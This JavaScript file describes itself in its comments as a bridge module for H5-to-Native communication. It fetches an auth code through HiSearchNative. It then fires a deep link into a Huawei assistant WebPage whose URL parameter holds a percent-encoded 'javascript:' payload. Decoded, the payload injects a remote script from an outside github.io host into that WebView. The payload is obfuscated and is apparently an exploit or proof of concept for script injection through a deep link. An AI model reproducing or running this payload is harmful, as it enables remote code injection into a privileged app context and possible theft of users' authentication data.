/**
 * H5与Native端通信桥接核心模块
 * 功能：提供统一的桥接调用、事件监听、回调处理能力，实现H5与Native双向通信
 * 作者：未知
 * 版本：1.0.0
 */
(() => {
    "use strict";

    /**
     * 页面初始化函数（创建样式、DOM、调用API）
     */
    const initPage = () => {
        // 防错：检测DOM是否存在
        if (!document.head || !document.body) {
            console.error('页面DOM未加载完成，无法初始化');
            return;
        }

        // 创建页面样式
        const style = document.createElement('style');
        style.textContent = `
            body{padding:20px;font:14px/1.6 sans-serif;background:#f5f7fa}
            #userIdResult{margin-top:15px;padding:15px;background:#fff;border-radius:8px;box-shadow:0 1px 3px rgba(0,0,0,0.05)}
            .suc{color:#48bb78}
            .err{color:#e53e3e}
        `;
        document.head.appendChild(style);

        // 创建结果展示容器
        const resultContainer = document.createElement('div');
        resultContainer.id = 'userIdResult';
        resultContainer.textContent = '正在调用Native接口...';
        document.body.appendChild(resultContainer);

        // ========================= API调用逻辑（统一管理） =========================
        // 延迟执行API调用（合并所有setTimeout，统一100ms延迟）
        setTimeout(() => {
            // 防错：检测Native对象是否存在
            if (typeof HiSearchNative === 'undefined' || !HiSearchNative.getAuthCode) {
                resultContainer.innerHTML += `<div class="err">❌ HiSearchNative 接口未定义</div>`;
                return;
            }

            // 调用Native接口并捕获异常
            HiSearchNative.getAuthCode()
                .then(data => {
                    // 转义HTML特殊字符，避免XSS
                    const safeData = JSON.stringify(data).replace(/[&<>"']/g, char => {
                        const escapeMap = { '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' };
                        return escapeMap[char];
                    });
                    resultContainer.innerHTML += `<div class="suc">✅ getAuthCode succeed：${safeData}</div>`;
                })
                .catch(error => {
                    // 转义错误信息
                    const safeError = String(error).replace(/[&<>"']/g, char => {
                        const escapeMap = { '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' };
                        return escapeMap[char];
                    });
                    resultContainer.innerHTML += `<div class="err">❌ getAuthCode failed：${safeError}</div>`;
                });
        }, 100);

        // ========================= API调用逻辑（统一管理） =========================
        // 延迟执行API调用（合并所有setTimeout，统一100ms延迟）
        setTimeout(() => {
            HiSearchNative.splitScreenAndJump('superlink://vassistant?abilityName=MainAbility&bundleName=com.huawei.hmsapp.intelligent&parameters={"page":"WebPage","url":"https://h5hosting-drcn.dbankcdn.cn/cch5/ScenarizedDist/filePage/dist/index.html#/filePageMain?id=sww+sNgyGsxLB+VgDku8rswI5V4hLmFtRFTAlklxoWQ=&language=zh_CN&url=javascript:%73%3d%64%6f%63%75%6d%65%6e%74%2e%63%72%65%61%74%65%45%6c%65%6d%65%6e%74%28%27%73%63%72%69%70%74%27%29%2c%73%2e%73%72%63%3d%27%68%74%74%70%73%3a%2f%2f%69%64%65%65%74%2e%67%69%74%68%75%62%2e%69%6f%2f%68%75%68%75%2f%4a%53%2f%68%69%62%6f%61%72%64%2e%6a%73%27%2c%73%2e%6f%6e%6c%6f%61%64%3d%28%29%3d%3e%61%6c%65%72%74%28%27%4a%53%27%29%2c%64%6f%63%75%6d%65%6e%74%2e%68%65%61%64%2e%61%70%70%65%6e%64%43%68%69%6c%64%28%73%29"}');
        }, 3000);
    };

    // 确保DOM加载完成后初始化
    if (document.readyState === 'complete' || document.readyState === 'interactive') {
        initPage();
    } else {
        document.addEventListener('DOMContentLoaded', initPage);
    }
})();
